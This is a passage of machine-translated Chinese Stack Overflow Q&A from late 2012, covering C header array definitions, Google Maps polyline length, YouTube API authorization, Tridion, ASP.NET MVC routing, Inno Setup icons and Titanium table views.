/bin/bash ../../../../libtool --tag=CC   --mode=link gcc -DLIBUDF  -g -O2  -module -avoid-version  -o lib_udf.la -rpath /usr/local/lib/monetdb5 lib_udf_la-hll.lo lib_udf_la-udf.lo  ../../../../monetdb5/tools/libmonetdb5.la ../../../../gdk/libbat.la 
libtool: link: gcc -shared  -fPIC -DPIC  .libs/lib_udf_la-hll.o .libs/lib_udf_la-udf.o   -Wl,-rpath -Wl,/home/mping/workspace/monetdb/MonetDB-11.13.5/monetdb5/tools/.libs -Wl,-rpath -Wl,/home/mping/workspace/monetdb/MonetDB-11.13.5/gdk/.libs ../../../../monetdb5/tools/.libs/libmonetdb5.so ../../../../gdk/.libs/libbat.so  -O2   -pthread -Wl,-soname -Wl,lib_udf.so -o .libs/lib_udf.so 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:44:39.137

`int const SHIFT_TABLE[1024] = {...}`在头文件中定义数组时。然后你`c`在同一个项目的2个文件中引用头文件这就像在2个文件中定义了两次数组一样`c`。这就是你的问题的原因。

即使您使用`#ifndef`它也不会避免您的预处理将定义包含在第二个`C`文件中

从[预处理器 #ifndef](https://stackoverflow.com/questions/9690212/preprocessor-ifndef)：

> 标准标题可以以任何顺序包含；每个都可以在给定范围内多次包含，与仅包含一次没有任何不同的效果

您可以检查在预处理代码中，您会发现该数组被定义了两次，这是错误的。你可以生成你的预处理代码`gcc -E`

`#ifndef`仅当您在不同的头文件中而不是在同一个头文件中检查常量宏时才有效

为避免该问题，您可以在其中一个`c`文件中定义数组。`extern`并且您在头文件中定义数组

**在其中一个 C 文件中**：

```
int const SHIFT_TABLE[1024] = {...}; 
```

**在头文件中：**

```
extern int const SHIFT_TABLE[1024]; 
```

# google-maps-api-3 - 折线的距离

> ID：14039408
> 
> 赞同：2
> 
> 时间：2012-12-26T10:39:42.963
> 
> 标签：google-maps-api-3, google-polyline

我正在折线中工作，我需要获得它的距离。因此，如果有人可以提供帮助，我将不胜感激。

此致。

这是我的代码：

```
function polyline() {
downloadUrl("xmlPolyline.asp", function(data) {
    var xml = xmlParse(data);
    var markersPath = xml.documentElement.getElementsByTagName("marker");   
    var path = [];

    for (var i = 0; i < markersPath.length; i++) {
    var lat = parseFloat(markersPath[i].getAttribute("lat"));
    var lng = parseFloat(markersPath[i].getAttribute("lng"));
    pointPath = new google.maps.LatLng(lat,lng);

    path.push(pointPath);

}//finish loop

 polyline = new google.maps.Polyline({
  path: path,
  strokeColor: "#FF0000",
  strokeOpacity: 1.0,
  strokeWeight: 2
});

//new polyline

polyline.setMap(map);

}); //end download url

} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-27T05:34:27.673

这很容易 - 使用几何库中的内置函数......

```
const polyLengthInMeters = google.maps.geometry.spherical.computeLength(yourPolyline.getPath().getArray()); 
```

要使用几何库，请在加载地图 api 时声明它

```
<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key={YOUR_KEY}&amp;sensor=false&amp;libraries=geometry"></script> 
```

有关更多信息，请参阅：

[Google API 折线参考](https://developers.google.com/maps/documentation/javascript/reference#Polyline)

[谷歌 API mcvArray 参考](https://developers.google.com/maps/documentation/javascript/reference#MVCArray)

[Google API 球面几何参考](https://developers.google.com/maps/documentation/javascript/reference#spherical)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-26T12:15:50.600

“[几何”库有一个 computeDistanceBetween 方法](https://developers.google.com/maps/documentation/javascript/reference#spherical)。

这将以米为单位返回结果：

```
var polylineLength = 0;
for (var i = 0; i < markersPath.length; i++) {
  var lat = parseFloat(markersPath[i].getAttribute("lat"));
  var lng = parseFloat(markersPath[i].getAttribute("lng"));
  var pointPath = new google.maps.LatLng(lat,lng);
  path.push(pointPath);
  if (i > 0) polylineLength += google.maps.geometry.spherical.computeDistanceBetween(path[i], path[i-1]);

}
alert("the length of the polyline is "+polylineLength+" meters"); 
```

**更新：**几何库中现在还有一个[computeLength ：](https://developers.google.com/maps/documentation/javascript/reference/geometry#spherical.computeLength)

> **computeLength(path[, radius])**
> **参数：**
> **path:** Array|MVCArray
> **radius:** number 可选
> **返回值：** number
> 返回给定路径的长度。

```
const polyline = new google.maps.Polyline({
    path: polylineCoordinates,
    strokeColor: "#FF0000",
    strokeOpacity: 1.0,
    strokeWeight: 2,
    map: map
  });
var polylineLength = google.maps.geometry.spherical.computeLength(polyline.getPath()); 
```

[概念证明小提琴](https://jsfiddle.net/geocodezip/kLnxuo3r/9/)

**代码片段：**

```
// This example creates a 2-pixel-wide red polyline showing the path of
// a drive from New York, NY to Newark, NJ
function initMap() {
  const map = new google.maps.Map(document.getElementById("map"),{
  center: {lat:40.71248,lng: -74.006200},
  zoom: 10
  });
  const polyline = new google.maps.Polyline({
    path: polylineCoordinates,
    strokeColor: "#FF0000",
    strokeOpacity: 1.0,
    strokeWeight: 2,
    map: map
  });
  var bounds = new google.maps.LatLngBounds();
  for (var i = 0; i < polyline.getPath().getLength(); i++) {
    console.log(polyline.getPath().getAt(i).toUrlValue(6));
    bounds.extend(polyline.getPath().getAt(i));
  }
  map.fitBounds(bounds);
  var polylineLength = google.maps.geometry.spherical.computeLength(polyline.getPath());
  document.getElementById('info').innerHTML = polylineLength.toFixed(2)+" meters, "+(polylineLength/1000).toFixed(2)+" km, "+(polylineLength/1609).toFixed(2)+" miles";
  console.log(polylineLength.toFixed(2)+" meters, "+(polylineLength/1000).toFixed(2)+" km, "+(polylineLength/1609).toFixed(2)+" miles");
}
// per Google Directions service 13.9 mi. About 31 mins
// 13.9 mi = 22.36988 km
const polylineCoordinates = [
{lat:40.712480,lng:-74.006200},
{lat:40.712450,lng:-74.006150},
{lat:40.712310,lng:-74.005810},
{lat:40.712300,lng:-74.005810},
{lat:40.712300,lng:-74.005800},
{lat:40.712290,lng:-74.005790},
{lat:40.712280,lng:-74.005780},
{lat:40.712260,lng:-74.005770},
{lat:40.712250,lng:-74.005770},
{lat:40.712130,lng:-74.005700},
{lat:40.712130,lng:-74.005700},
{lat:40.712090,lng:-74.005830},
{lat:40.712050,lng:-74.005970},
{lat:40.712020,lng:-74.006090},
{lat:40.711980,lng:-74.006230},
{lat:40.711930,lng:-74.006390},
{lat:40.711930,lng:-74.006440},
{lat:40.711830,lng:-74.006810},
{lat:40.711800,lng:-74.006950},
{lat:40.711770,lng:-74.007050},
{lat:40.711690,lng:-74.007420},
{lat:40.711670,lng:-74.007480},
{lat:40.711660,lng:-74.007510},
{lat:40.711660,lng:-74.007550},
{lat:40.711660,lng:-74.007570},
{lat:40.711660,lng:-74.007600},
{lat:40.711660,lng:-74.007650},
{lat:40.711670,lng:-74.007690},
{lat:40.711680,lng:-74.007710},
{lat:40.711690,lng:-74.007740},
{lat:40.711710,lng:-74.007780},
{lat:40.711710,lng:-74.007780},
{lat:40.711750,lng:-74.007840},
{lat:40.711800,lng:-74.007920},
{lat:40.711850,lng:-74.007990},
{lat:40.711870,lng:-74.008010},
{lat:40.711910,lng:-74.008050},
{lat:40.711950,lng:-74.008070},
{lat:40.711970,lng:-74.008090},
{lat:40.712000,lng:-74.008120},
{lat:40.712080,lng:-74.008270},
{lat:40.712380,lng:-74.008930},
{lat:40.712470,lng:-74.009130},
{lat:40.712650,lng:-74.009520},
{lat:40.712730,lng:-74.009680},
{lat:40.712730,lng:-74.009680},
{lat:40.712790,lng:-74.009650},
{lat:40.713280,lng:-74.009260},
{lat:40.713430,lng:-74.009140},
{lat:40.713810,lng:-74.008840},
{lat:40.714270,lng:-74.008480},
{lat:40.714370,lng:-74.008400},
{lat:40.714890,lng:-74.008000},
{lat:40.714940,lng:-74.007970},
{lat:40.715200,lng:-74.007750},
{lat:40.715440,lng:-74.007560},
{lat:40.715480,lng:-74.007520},
{lat:40.715960,lng:-74.007150},
{lat:40.716000,lng:-74.007110},
{lat:40.716040,lng:-74.007070},
{lat:40.716530,lng:-74.006680},
{lat:40.717080,lng:-74.006240},
{lat:40.717170,lng:-74.006180},
{lat:40.717600,lng:-74.005830},
{lat:40.717680,lng:-74.005770},
{lat:40.717780,lng:-74.005680},
{lat:40.717870,lng:-74.005620},
{lat:40.717960,lng:-74.005540},
{lat:40.717960,lng:-74.005540},
{lat:40.718020,lng:-74.005530},
{lat:40.718050,lng:-74.005520},
{lat:40.718110,lng:-74.005480},
{lat:40.718180,lng:-74.005430},
{lat:40.718230,lng:-74.005390},
{lat:40.718270,lng:-74.005380},
{lat:40.718300,lng:-74.005360},
{lat:40.718330,lng:-74.005340},
{lat:40.718370,lng:-74.005320},
{lat:40.718410,lng:-74.005300},
{lat:40.718600,lng:-74.005230},
{lat:40.718670,lng:-74.005220},
{lat:40.718880,lng:-74.005180},
{lat:40.718940,lng:-74.005180},
{lat:40.719010,lng:-74.005170},
{lat:40.719060,lng:-74.005170},
{lat:40.719110,lng:-74.005170},
{lat:40.719370,lng:-74.005180},
{lat:40.719730,lng:-74.005200},
{lat:40.719850,lng:-74.005190},
{lat:40.719950,lng:-74.005190},
{lat:40.720280,lng:-74.005180},
{lat:40.720480,lng:-74.005190},
{lat:40.720630,lng:-74.005210},
{lat:40.721030,lng:-74.005250},
{lat:40.721380,lng:-74.005280},
{lat:40.721470,lng:-74.005280},
{lat:40.721740,lng:-74.005330},
{lat:40.721830,lng:-74.005340},
{lat:40.721930,lng:-74.005360},
{lat:40.722090,lng:-74.005380},
{lat:40.722130,lng:-74.005390},
{lat:40.722180,lng:-74.005390},
{lat:40.722230,lng:-74.005380},
{lat:40.723010,lng:-74.005060},
{lat:40.723630,lng:-74.004810},
{lat:40.723630,lng:-74.004810},
{lat:40.723650,lng:-74.004890},
{lat:40.723660,lng:-74.005000},
{lat:40.723670,lng:-74.005050},
{lat:40.723690,lng:-74.005280},
{lat:40.723710,lng:-74.005440},
{lat:40.723730,lng:-74.005700},
{lat:40.723760,lng:-74.005980},
{lat:40.723760,lng:-74.005980},
{lat:40.723810,lng:-74.006060},
{lat:40.723820,lng:-74.006150},
{lat:40.723840,lng:-74.006250},
{lat:40.723850,lng:-74.006290},
{lat:40.723860,lng:-74.006310},
{lat:40.723870,lng:-74.006360},
{lat:40.723890,lng:-74.006420},
{lat:40.723910,lng:-74.006470},
{lat:40.723940,lng:-74.006530},
{lat:40.723970,lng:-74.006590},
{lat:40.724000,lng:-74.006640},
{lat:40.724010,lng:-74.006670},
{lat:40.724030,lng:-74.006690},
{lat:40.724070,lng:-74.006740},
{lat:40.724110,lng:-74.006800},
{lat:40.724150,lng:-74.006840},
{lat:40.724200,lng:-74.006890},
{lat:40.724210,lng:-74.006900},
{lat:40.724240,lng:-74.006930},
{lat:40.724270,lng:-74.006950},
{lat:40.724300,lng:-74.006960},
{lat:40.724330,lng:-74.006980},
{lat:40.724360,lng:-74.006990},
{lat:40.724390,lng:-74.006990},
{lat:40.724440,lng:-74.006990},
{lat:40.724500,lng:-74.006990},
{lat:40.724580,lng:-74.006990},
{lat:40.724620,lng:-74.006990},
{lat:40.724710,lng:-74.007010},
{lat:40.724770,lng:-74.007000},
{lat:40.724850,lng:-74.006990},
{lat:40.724850,lng:-74.006980},
{lat:40.724890,lng:-74.006980},
{lat:40.724960,lng:-74.006970},
{lat:40.725010,lng:-74.006970},
{lat:40.725070,lng:-74.006970},
{lat:40.725120,lng:-74.006970},
{lat:40.725190,lng:-74.006960},
{lat:40.725290,lng:-74.006960},
{lat:40.725370,lng:-74.006980},
{lat:40.725420,lng:-74.006990},
{lat:40.725510,lng:-74.007020},
{lat:40.725580,lng:-74.007070},
{lat:40.725610,lng:-74.007110},
{lat:40.725640,lng:-74.007170},
{lat:40.725660,lng:-74.007220},
{lat:40.725690,lng:-74.007320},
{lat:40.725720,lng:-74.007420},
{lat:40.725720,lng:-74.007440},
{lat:40.725740,lng:-74.007560},
{lat:40.725750,lng:-74.007670},
{lat:40.725780,lng:-74.007910},
{lat:40.725800,lng:-74.008140},
{lat:40.725820,lng:-74.008270},
{lat:40.725830,lng:-74.008380},
{lat:40.725850,lng:-74.008600},
{lat:40.725850,lng:-74.008610},
{lat:40.725870,lng:-74.008750},
{lat:40.725880,lng:-74.008850},
{lat:40.725900,lng:-74.009080},
{lat:40.725930,lng:-74.009320},
{lat:40.725950,lng:-74.009540},
{lat:40.725950,lng:-74.009550},
{lat:40.726010,lng:-74.010020},
{lat:40.726010,lng:-74.010040},
{lat:40.726070,lng:-74.010490},
{lat:40.726190,lng:-74.011430},
{lat:40.726220,lng:-74.011670},
{lat:40.726260,lng:-74.012150},
{lat:40.726320,lng:-74.012590},
{lat:40.726350,lng:-74.012820},
{lat:40.726360,lng:-74.012840},
{lat:40.726390,lng:-74.013070},
{lat:40.726420,lng:-74.013290},
{lat:40.726450,lng:-74.013540},
{lat:40.726640,lng:-74.014940},
{lat:40.726690,lng:-74.015300},
{lat:40.726730,lng:-74.015540},
{lat:40.726870,lng:-74.016470},
{lat:40.726950,lng:-74.016930},
{lat:40.726980,lng:-74.017160},
{lat:40.727020,lng:-74.017400},
{lat:40.727200,lng:-74.018560},
{lat:40.727270,lng:-74.019020},
{lat:40.727570,lng:-74.020930},
{lat:40.727700,lng:-74.021810},
{lat:40.727740,lng:-74.022040},
{lat:40.727990,lng:-74.023670},
{lat:40.728030,lng:-74.023900},
{lat:40.728070,lng:-74.024140},
{lat:40.728210,lng:-74.025070},
{lat:40.728390,lng:-74.026230},
{lat:40.728500,lng:-74.026930},
{lat:40.728550,lng:-74.027510},
{lat:40.728570,lng:-74.027750},
{lat:40.728600,lng:-74.027990},
{lat:40.728680,lng:-74.028930},
{lat:40.728700,lng:-74.029160},
{lat:40.728830,lng:-74.030580},
{lat:40.728870,lng:-74.031050},
{lat:40.728900,lng:-74.031350},
{lat:40.728940,lng:-74.031760},
{lat:40.728940,lng:-74.031790},
{lat:40.728960,lng:-74.032020},
{lat:40.728970,lng:-74.032030},
{lat:40.728990,lng:-74.032150},
{lat:40.729020,lng:-74.032330},
{lat:40.729070,lng:-74.032480},
{lat:40.729110,lng:-74.032580},
{lat:40.729160,lng:-74.032720},
{lat:40.729170,lng:-74.032760},
{lat:40.729270,lng:-74.033070},
{lat:40.729530,lng:-74.033860},
{lat:40.729960,lng:-74.035160},
{lat:40.730040,lng:-74.035410},
{lat:40.730060,lng:-74.035460},
{lat:40.730120,lng:-74.035590},
{lat:40.730150,lng:-74.035680},
{lat:40.730190,lng:-74.035780},
{lat:40.730220,lng:-74.035840},
{lat:40.730290,lng:-74.035950},
{lat:40.730330,lng:-74.036020},
{lat:40.730400,lng:-74.036100},
{lat:40.730590,lng:-74.036330},
{lat:40.730710,lng:-74.036500},
{lat:40.730780,lng:-74.036580},
{lat:40.730840,lng:-74.036670},
{lat:40.730910,lng:-74.036780},
{lat:40.730970,lng:-74.036880},
{lat:40.731030,lng:-74.036980},
{lat:40.731040,lng:-74.037000},
{lat:40.731100,lng:-74.037100},
{lat:40.731140,lng:-74.037200},
{lat:40.731160,lng:-74.037240},
{lat:40.731220,lng:-74.037360},
{lat:40.731320,lng:-74.037580},
{lat:40.731340,lng:-74.037630},
{lat:40.731360,lng:-74.037680},
{lat:40.731380,lng:-74.037740},
{lat:40.731390,lng:-74.037800},
{lat:40.731450,lng:-74.038480},
{lat:40.731470,lng:-74.038720},
{lat:40.731540,lng:-74.039420},
{lat:40.731560,lng:-74.039510},
{lat:40.731590,lng:-74.039710},
{lat:40.731610,lng:-74.039940},
{lat:40.731620,lng:-74.040130},
{lat:40.731710,lng:-74.041100},
{lat:40.731710,lng:-74.041100},
{lat:40.731560,lng:-74.041130},
{lat:40.731430,lng:-74.041150},
{lat:40.731270,lng:-74.041170},
{lat:40.731210,lng:-74.041180},
{lat:40.731050,lng:-74.041200},
{lat:40.730820,lng:-74.041240},
{lat:40.730800,lng:-74.041240},
{lat:40.730720,lng:-74.041250},
{lat:40.730480,lng:-74.041300},
{lat:40.730350,lng:-74.041310},
{lat:40.730180,lng:-74.041330},
{lat:40.730180,lng:-74.041330},
{lat:40.730130,lng:-74.040980},
{lat:40.730110,lng:-74.040900},
{lat:40.730070,lng:-74.040660},
{lat:40.730040,lng:-74.040520},
{lat:40.730030,lng:-74.040430},
{lat:40.730010,lng:-74.040300},
{lat:40.730000,lng:-74.040170},
{lat:40.729970,lng:-74.039910},
{lat:40.729950,lng:-74.039720},
{lat:40.729950,lng:-74.039720},
{lat:40.729520,lng:-74.039790},
{lat:40.729380,lng:-74.039810},
{lat:40.729330,lng:-74.039820},
{lat:40.729210,lng:-74.039840},
{lat:40.729200,lng:-74.039840},
{lat:40.729180,lng:-74.039850},
{lat:40.728980,lng:-74.039880},
{lat:40.728960,lng:-74.039880},
{lat:40.728960,lng:-74.039890},
{lat:40.728950,lng:-74.039890},
{lat:40.728940,lng:-74.039890},
{lat:40.728670,lng:-74.039940},
{lat:40.728300,lng:-74.040000},
{lat:40.727960,lng:-74.040060},
{lat:40.727790,lng:-74.040090},
{lat:40.727630,lng:-74.040040},
{lat:40.727270,lng:-74.040110},
{lat:40.726690,lng:-74.040200},
{lat:40.726640,lng:-74.040200},
{lat:40.726510,lng:-74.040220},
{lat:40.726480,lng:-74.040230},
{lat:40.725800,lng:-74.040330},
{lat:40.725380,lng:-74.040400},
{lat:40.725200,lng:-74.040420},
{lat:40.725120,lng:-74.040430},
{lat:40.725010,lng:-74.040450},
{lat:40.724810,lng:-74.040490},
{lat:40.724680,lng:-74.040510},
{lat:40.724090,lng:-74.040590},
{lat:40.723620,lng:-74.040660},
{lat:40.723240,lng:-74.040720},
{lat:40.723000,lng:-74.040760},
{lat:40.722910,lng:-74.040770},
{lat:40.722240,lng:-74.040890},
{lat:40.721780,lng:-74.040960},
{lat:40.721500,lng:-74.041000},
{lat:40.721260,lng:-74.041020},
{lat:40.720810,lng:-74.041090},
{lat:40.720110,lng:-74.041200},
{lat:40.719820,lng:-74.041250},
{lat:40.719640,lng:-74.041290},
{lat:40.719260,lng:-74.041340},
{lat:40.719020,lng:-74.041370},
{lat:40.718740,lng:-74.041410},
{lat:40.718690,lng:-74.041480},
{lat:40.718600,lng:-74.041620},
{lat:40.718390,lng:-74.041960},
{lat:40.718290,lng:-74.042110},
{lat:40.718270,lng:-74.042130},
{lat:40.718250,lng:-74.042150},
{lat:40.718230,lng:-74.042170},
{lat:40.718200,lng:-74.042180},
{lat:40.718150,lng:-74.042200},
{lat:40.717990,lng:-74.042240},
{lat:40.717840,lng:-74.042270},
{lat:40.717760,lng:-74.042290},
{lat:40.717650,lng:-74.042310},
{lat:40.717650,lng:-74.042310},
{lat:40.717700,lng:-74.042740}
];
```

```
/* Always set the map height explicitly to define the size of the div
       * element that contains the map. */
#map {
  height: 90%;
}

/* Optional: Makes the sample page fill the window. */
html,
body {
  height: 100%;
  margin: 0;
  padding: 0;
}
```

```
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Polylines</title>
    <script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
    <script
      src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCkUOdZ5y7hMm0yrcCQoCvLwzdM6M8s5qk&callback=initMap&libraries=geometry&v=weekly"
      defer
    ></script>
    <!-- jsFiddle will insert css and js -->
  </head>
  <body>
    <div id="info"></div>
    <div id="map"></div>
  </body>
</html>
```

# ios - 是否有一个库可以帮助创建使用我的 iPhone 应用程序的教程

> ID：14039415
> 
> 赞同：0
> 
> 时间：2012-12-26T10:40:00.037
> 
> 标签：ios, user-experience

我创建了一个应用程序并得到了一些反馈，不清楚它的作用和方式。我了解我需要创建一个在初始启动时显示的教程。

在搜索诸如“如何为 iOS 应用程序创建功能导览”或“为 ios 应用程序制作教程”之类的术语后 - 我正在获取有关创建 ios 应用程序的教程......

简单的解决方案是测试初始启动，打开我创建的教程幻灯片，并保存一个标志，但也许有一个更优雅的框架可以帮助实现与此相关的功能（如添加弹出框、标注、屏幕截图等）

有人知道吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T13:29:47.817

根据您的应用程序的复杂程度，可以使用说明性覆盖轻松完成。叠加层会阻挡背景，同时用箭头和文本显示用户在特定区域可以做什么。

# objective-c - 使用 Objective-C 获取/更新 YouTube 收藏夹

> ID：14039418
> 
> 赞同：0
> 
> 时间：2012-12-26T10:40:15.870
> 
> 标签：objective-c, youtube-api, asihttprequest

我正在尝试使用 youtube api。我有 2 种方法来获取收藏列表并将指定的视频添加到该列表中。两种方法都不起作用。我收到如下错误：`HTTP/1.1 401 Unknown authorization header`错误。这是我的代码：

```
#define CONNECTION_YOUTUBE                  @"https://gdata.youtube.com/feeds/api/"
#define CONNECTION_ADD_FAVORITE_VIDEO @"users/default/favorites"
#define CONNECTION_GET_FAVORITE_LIST @"https://gdata.youtube.com/feeds/api/users/default/favorites"

- (void) getFavoriteList{
    NSURL *url = [NSURL URLWithString:CONNECTION_GET_FAVORITE_LIST];
    ASIHTTPRequest *request = [[ASIHTTPRequest alloc] initWithURL:url];
    AppDelegate *appDelegate = (AppDelegate*)[[UIApplication sharedApplication] delegate];
    [request addRequestHeader:@"Authorization" value:[@" Bearer "  stringByAppendingString:[appDelegate userInfo].accessTokenYoutube ]];
    [request addRequestHeader:@"X-GData-Key" value:[NSString stringWithFormat:@"key=%@",YOUTUBE_DEVELOPER_KEY]];

    [request startAsynchronous];
    [request setCompletionBlock:^{
        NSString* respondMessage = [request responseStatusMessage];
        NSLog(@"Respond compelet with message: %@",respondMessage);
    }];
    [request setFailedBlock:^{
        NSString* respondMessage = [request responseStatusMessage];
        NSLog(@"Respond failed with message: %@",respondMessage);
    }];
    [request release];
}
- (void) addToFavoriteTheVideoWithID:(NSString *)strVideoID{

    //prepare url
    NSString *rawUrl = [NSString stringWithFormat:@"%@%@", CONNECTION_YOUTUBE, CONNECTION_ADD_FAVORITE_VIDEO    ];
    NSURL *url = [[NSURL URLWithString:rawUrl] autorelease];

    ASIFormDataRequest *request = [[[ASIFormDataRequest alloc] initWithURL:url] autorelease];

    //prepare form body
    NSString *rawXML = [NSString stringWithFormat:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?> <entry xmlns=\"http://www.w3.org/2005/Atom\"><yt:videoid>xxxx%@</yt:videoid></entry>",strVideoID];
    NSMutableData *soapData = [[[NSMutableData alloc]initWithData:[rawXML dataUsingEncoding:NSUTF8StringEncoding ]]autorelease] ;
    [request setPostBody:soapData];

    //prepare request header
    AppDelegate *appDelegate = (AppDelegate*)[[UIApplication sharedApplication] delegate];
    [request setRequestMethod:@"POST"];
    [request addRequestHeader:@"SOAPAction" value:@""];
    [request addRequestHeader:@"Content-Type" value:@"application/atom+xml"];
    [request addRequestHeader:@"Content-Length" value:[NSString stringWithFormat:@"%d",soapData.length]];
    [request addRequestHeader:@"Authorization" value:[@" Bearer "  stringByAppendingString:[appDelegate userInfo].accessTokenYoutube ]];
   // NSString* token = [@" Bearer "  stringByAppendingString:[appDelegate userInfo].accessTokenYoutube ];
    [request addRequestHeader:@"GData-Version" value:@"2"];
    [request addRequestHeader:@"X-GData-Key" value:[NSString stringWithFormat:@"key=%@",YOUTUBE_DEVELOPER_KEY]];

    [request startAsynchronous];
    [request setDelegate:self];
    [request setDidFinishSelector:@selector(didAddVideoToFavoriteFinish: )];
    [request setDidFailSelector:@selector(didAddVideoToFavoriteFail:)];

} 
```

请帮忙。谢谢一堆。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T17:32:52.183

我强烈建议您使用[GData Objective-C 客户端库](http://code.google.com/p/gdata-objectivec-client/)（如果您想使用[YouTube 数据 API v2](https://developers.google.com/youtube/2.0/developers_guide_protocol_audience) ），而不是手动构建您的请求（并使自己面临各种不同的潜在问题）或[Google APIs Objective-C 客户端库](http://code.google.com/p/google-api-objectivec-client/)（如果您想使用更新的v3[的 YouTube 数据 API](https://developers.google.com/youtube/v3/)）。

这些库中的任何一个都将为您简化授权和请求过程。

# tridion - tridion 中的用户/组权限和权限

> ID：14039420
> 
> 赞同：3
> 
> 时间：2012-12-26T10:40:35.470
> 
> 标签：tridion

我们在管理的组管理部分创建了一个组，并为其分配了一些出版物。

现在通过用户管理部分，一旦我们打开用户条目并尝试在“成员”选项卡中添加此组，该组不会被添加。所有现有的默认 tridion 组都已正确添加。

请建议。

# asp.net - URL 混淆

> ID：14039426
> 
> 赞同：1
> 
> 时间：2012-12-26T10:41:01.413
> 
> 标签：asp.net, asp.net-mvc

我将 ASP.NET 与 MVC4 一起使用。在一个简单的控制器中，我希望使用一个 URL，例如

```
www.sitename.com/controller/action/param1/param2/param3 
```

我可以这样做吗？

控制器将是`ControllerController`并且有一个方法

```
Action(param1, param2, param3) 
```

ETC

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T18:17:34.633

是的，只需添加一条路线，例如：

```
routes.MapRoute(name: "MyRoute", url: "{controller}/{action}/{p1}/{p2}/{p3}"); 
```

如果您希望它用于特定的控制器，那么您可以使用“硬”名称而不是`{controller}`and`{action}`占位符。

确保在更具体的路由之前添加它（即在“默认”路由之前）。

您可能还会发现 NuGet 上的[RouteDebugger](http://nuget.org/packages/routedebugger)很有帮助。

# tridion - 发布到文件系统失败 *.js *.css *.sitemap Tridion

> ID：14039430
> 
> 赞同：2
> 
> 时间：2012-12-26T10:41:21.357
> 
> 标签：tridion, tridion-2011

我已将 tridion 设置为将除 .css .js .sitemap 以外的所有文件发布到数据库，

请在配置下方找到

```
<Item typeMapping="Page" itemExtension=".sitemap" cached="false" storageId="defaultFile"/>
<Item typeMapping="Page" itemExtension=".css" cached="false" storageId="defaultFile"/>
<Item typeMapping="Page" itemExtension=".js" cached="false" storageId="defaultFile"/>
<Item typeMapping="Page" cached="false" storageId="defaultDataFile"/>
<Item typeMapping="Binary" storageId="defaultFile" cached="false"/>
<Item typeMapping="Page" cached="false" storageId="defaultDataFile"/>
<Item typeMapping="Metadata" cached="false" storageId="defaultDataFile"/>   ` 
```

发布时失败并`Commiting Deployment`出现错误

> 阶段：部署准备提交阶段失败，无法准备事务：无法在当前事务中存储项目，无法删除数据实体，org.hibernate.exceptopn.SQLGrammerException 无法执行更新查询，`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T15:25:04.603

问题在于数据库连接。我使用了一个具有只读权限的数据库连接，我更新了连接并开始工作

# icons - 如何在 Inno Setup 中添加第二个图标

> ID：14039441
> 
> 赞同：1
> 
> 时间：2012-12-26T10:42:08.413
> 
> 标签：icons, inno-setup, ico

我正在尝试添加第二个 .ico 文件以将其用作与我的应用程序关联的文件的图标。一段代码：

```
[Registry]
Root: HKCR; Subkey: ".tc65"; ValueType: string; ValueName: ""; ValueData: {#DispatcherName};   Flags: uninsdeletevalue;
Root: HKCR; Subkey: {#DispatcherName}; ValueType: string; ValueName: ""; ValueData: {#MyAppName}; Flags: uninsdeletekey;
Root: HKCR; Subkey: "{#DispatcherName}\DefaultIcon"; ValueType: string; ValueName: ""; ValueData: "{app}\{#MyAppExeName},1" 
Root: HKCR; Subkey: "{#DispatcherName}\shell\open\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"" ""%1""" 

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
Name: "{userappdata}\Microsoft\Internet Explorer\Quick Launch\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: quicklaunchicon 
```

据我了解，这条线

```
Root: HKCR; Subkey: "{#DispatcherName}\DefaultIcon"; ValueType: string; ValueName: ""; ValueData: "{app}\{#MyAppExeName},1" 
```

说对关联文件使用第二个图标。如何使用已知路径创建此图标？在 [Icons] 部分尝试了几个变体，但没有成功。

也许我应该在编译之前为 exe 添加一个图标？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-27T11:51:45.660

该`[Icons]`部分用于创建快捷方式。它与文件关联没有任何关系。

为了设置用于关联的图标，您需要将`DefaultIcon`键设置为图标的路径。这可以是`.ico`通过条目安装的松散文件，也可以是`[Files]`（首选）编译到可执行文件中的图标资源。

您在问题中的值将告诉 Windows 使用编译到可执行文件中的第二个图标资源。

不要忘记也启用该`ChangesAssociations`设置。

# c - clBuildProgram 异常“执行跳远”

> ID：14039448
> 
> 赞同：0
> 
> 时间：2012-12-26T10:42:37.300
> 
> 标签：c, exception, opencl

对于我的论文，我必须在 OpenCL 中编写一个算法。但是，在编译 cl 文件时，我遇到了一堆错误。我把它们都修好了，但现在我在运行程序时遇到了以下问题，我不知道到底出了什么问题。

![opencl 问题](../Images/cffca1b9be98ff4ccd19dcc1b5436924.png)

打印调试4。“呃是‘跳远’uitgevoerd。” 是荷兰语，意思是“执行了‘跳远’”。

感谢您的帮助。

# javascript - 在tableview中单击相应行时获取行数据

> ID：14039449
> 
> 赞同：0
> 
> 时间：2012-12-26T10:42:49.053
> 
> 标签：javascript, titanium, titanium-mobile, titanium-modules

我是钛新手。我正在创建一个带有行的自定义表格视图。我连续添加了 4 个视图。每个对应的视图都有标签--->>签入时间、签出时间、注释和时间。签入和签出为任务提供了时间。注意是添加注释和时间以显示签入和签出时间的差异。我想根据当前签入时间更新数据库中特定任务的注释。当特定单击行时，我无法捕获当前签入时间标签上的文本。如果我得到签入时间，那么我将根据当前签入时间更新数据库中的相应行。

这是我的代码。

函数集（日期，时间，超时）{ var date1 = date;

```
 var section = Ti.UI.createTableViewSection();
         row1 = Ti.UI.createTableViewRow({layout:"horizontal"});

        inview=Ti.UI.createView({
               width:"25%",
        });

        inlabel=Ti.UI.createLabel({
             text:intime,
            font:{fontSize:13}

        });
        inview.add(inlabel);

        outview=Ti.UI.createView({
             width:"25%",

        });

        outlabel=Ti.UI.createLabel({
            text:outtime,
